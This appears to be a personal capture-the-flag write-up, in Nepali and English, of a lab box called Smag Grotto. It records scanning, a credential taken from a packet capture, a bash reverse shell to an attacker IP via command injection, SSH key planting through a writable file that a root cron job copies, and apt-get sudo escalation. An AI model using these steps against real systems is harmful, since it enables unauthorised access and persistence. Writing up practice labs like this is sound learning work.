Suru ma ta nmap, host down re -Pn hane

aayo

```jsx
# Nmap 7.95 scan initiated Mon Jun 30 22:26:09 2025 as: /usr/lib/nmap/nmap --privileged -Pn --top-ports 1000 -oN nmap_Pn_top1000 10.10.206.32
Nmap scan report for 10.10.206.32
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Mon Jun 30 22:26:50 2025 -- 1 IP address (1 host up) scanned in 40.66 seconds
# Nmap 7.95 scan initiated Mon Jun 30 22:32:03 2025 as: /usr/lib/nmap/nmap --privileged -sCV -p22,80 -oN nmap_sCV_p22_80 10.10.206.32
Nmap scan report for 10.10.206.32
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Smag
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
# Nmap done at Mon Jun 30 22:32:16 2025 -- 1 IP address (1 host up) scanned in 13.23 seconds
                                                                                               
```

ani dir fuzz hane

```jsx
┌──(namura㉿namu)-[~/thm/smaggrotto]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u <http://smag.thm/FUZZ> -recursion -recursion-depth 3 -t 200 

        /'___\\  /'___\\           /'___\\       
       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       
       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      
        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      
         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       
          \\/_/    \\/_/   \\/___/    \\/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : <http://smag.thm/FUZZ>
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 172ms]
.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 5467ms]
mail                    [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 174ms]
[INFO] Adding a new job to the queue: <http://smag.thm/mail/FUZZ>

server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 173ms]
[INFO] Starting queued job on target: <http://smag.thm/mail/FUZZ>

.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 181ms]
.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 181ms]
:: Progress: [20478/20478] :: Job [2/2] :: 94 req/sec :: Duration: [0:00:39] :: Errors: 0 ::

```

/mail was interesting

subdomain enum also done

- subdomains
    
    ```jsx
    nikai lamo raixa
    development bhanne chai xa raixa tara chalena huhu
    ```
    

maule mail bhanne dir ma gako ta dherai kura raixa bingo

```jsx
Network Migration
Due to the exponential growth of our platform, and thus the need for more systems, we need to migrate everything from our current 192.168.33.0/24 network to the 10.10.0.0/8 network.

The previous engineer had done some network traces so hopefully they will give you an idea of how our systems are addressed.

dHJhY2Uy.pcap
To: netadmin@smag.thm Cc: uzi@smag.thm From: jake@smag.thm
Re: Network Migration
I tried downloading the file but I found an anomaly in the attached file, could you please tell me what has happened here?

To: jake@smag.thm Cc: netadmin@smag.thm From: uzi@smag.thm
Re: Network Migration
Hi Uzi, as the previous developer had found a bug in the email2web software that he has been unable to fix, could you please download all attachments with wget until further notice, thank you.

To: uzi@smag.thm Cc: netadmin@smag.thm From: jake@smag.com
```

Maile tyo .pcap file download gare tara ani wireshark hane

damn

`helpdesk:cH4nG3M3_n0w`

tyo packet mai ka redirect bhako bhanera pani thiyo

![image.png](attachment:4b1f5dce-4782-407e-98d1-5b876110f2a8:image.png)

aba DNS hale ani tyaspaxi

gaye development.smag.thm ma

ani masta le login hane

ani lolol

![image.png](attachment:fbcc92ff-4e6d-46b3-8cdc-56927cebc7a7:image.png)

yesto dekhaune raixa

maybe aba yesma cmd injection hanna milxa (obviously)

```jsx
bash -c 'exec bash -i &>/dev/tcp/10.17.19.181/6969 <&1'
```

and we are innn

```jsx
┌──(namura㉿namu)-[~/thm/smaggrotto]
└─$ nc -lnvp 6969                                     
listening on [any] 6969 ...
connect to [10.17.19.181] from (UNKNOWN) [10.10.206.32] 35368
bash: cannot set terminal process group (727): Inappropriate ioctl for device
bash: no job control in this shell
www-data@smag:/var/www/development.smag.thm$ ls
ls
admin.php
login.php
materialize.min.css
www-data@smag:/var/www/development.smag.thm$ pwd
pwd
/var/www/development.smag.thm
www-data@smag:/var/www/development.smag.thm$ wj^H^H^H
  
www-data@smag:/var/www/development.smag.thm$ whoami
whoami
www-data
www-data@smag:/var/www/development.smag.thm$ sudo -l
sudo -l
sudo: no tty present and no askpass program specified
www-data@smag:/var/www/development.smag.thm$ 

```

and then we got a stable shell using python3 using pty.spawn(”/bin/bash”)

my tty shell gut stuck for the 4th time ☹️ what the hail is this

mfing 6th time

aba bholi matrai try garxu

Soo lineas hane suru ma

Linux kernel exploit haru kk raixan kei kaam nalagne raixa

ani tala tala herdai jada ta crobtab ma euta raixa

```jsx
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys

```

ani jake ko backup ma bhako lai append garyo bhane ssh ayth hune raixa

We can write on it yay~

```jsx
www-data@smag:/tmp$ ls -ls /opt/.backups/jake_id_rsa.pub.backup
ls -ls /opt/.backups/jake_id_rsa.pub.backup
4 -rw-rw-rw- 1 root root 737 Jul  1 10:15 /opt/.backups/jake_id_rsa.pub.backup
www-data@smag:/tmp$ 

```

So, I did a key gen

```jsx
└─$ ssh-keygen -t rsa -b 4096 -f mybackdoor_key

Generating public/private rsa key pair.
Enter passphrase for "mybackdoor_key" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in mybackdoor_key
Your public key has been saved in mybackdoor_key.pub
The key fingerprint is:
SHA256:tNlc45jT0BizmEvxTfw+LddrI8Etig9XgQ1ORokbnRM namura@namu
The key's randomart image is:
+---[RSA 4096]----+
|        . *E=    |
|         B+&=    |
|        = Bo*+   |
|       o B B .o  |
|        S * +o...|
|           ..++.+|
|         .... o+.|
|         .o. . + |
|          ..  o .|
+----[SHA256]-----+

```

ani public key lai tyasma halde

```jsx
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCxKeVcyA8A6zlIO7wwcm23vcNnyW08bs/nW2VXIX8Al7klZ9f+mVnSoZelpD/Guw5/EncmVSoG7p72p5LfjIjFnsFnGhX0D0XM7T1DdIF2F8YVk4BxliqQ8Dmw12aZmCeW11rNxAdIqrBBXd9Je+L41RzZVOb29vbc2ZGeRTpNoOODvYSf7SW5Nm6Qi9RceESNXOLF3yBs7BLN0b1H7Ee2WX264/xsXCvX2GQqwPgha/kXWTZOwVNjggdYpV6buZq24a4dfGsXHAn2d6qtJSublLVfr2WcelLMs2yeqUkkqGWaOpBGaaNfrvyMAP+sXOum22W3l3cWpkqI5C/GOxAHoM0tmit4dD72Q5Rykwhxt96UM/55GmZSMiCxjjBvNsEO3My8iXAsONldH9tTlMQuuTU6YHOsKIwzrVNzrvnStuqtMwpOZV/I3RUI+X77FXMUY000QiVn/6DwgwBg/EzeiYzFpvT3H0mHGmeWUBQjtRFgEToUZjiFaSiCnbQ4IvjMy+YZ6kleuA5gXy70ee6UEkACY2z5n9Aji81mZN9e7m4IKYCllWxkEE/9/C0oE843Wj+305qx0T/b/hcOoP3ZuUjAxnx2Wb2PvAQFf7lMgtEJoLc4HTd4gGIDqebyXV3GrOnKa3CoESURBhwdlI1NBlxmeovOBxtYIuAFzeyKvQ== namura@namu" > /opt/.backups/jake_id_rsa.pub.backup
uplI1NBlxmeovOBxtYIuAFzeyKvQ== namura@namu" > /opt/.backups/jake_id_rsa.pub.back 

```

ani tyaspaxi using the backdoor key maile login gare using ssh

and we are innnn

```jsx
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get

```

Then maile gtfo bins bata apt-get check gare

euta kaam garyo ani we got privesc

yay~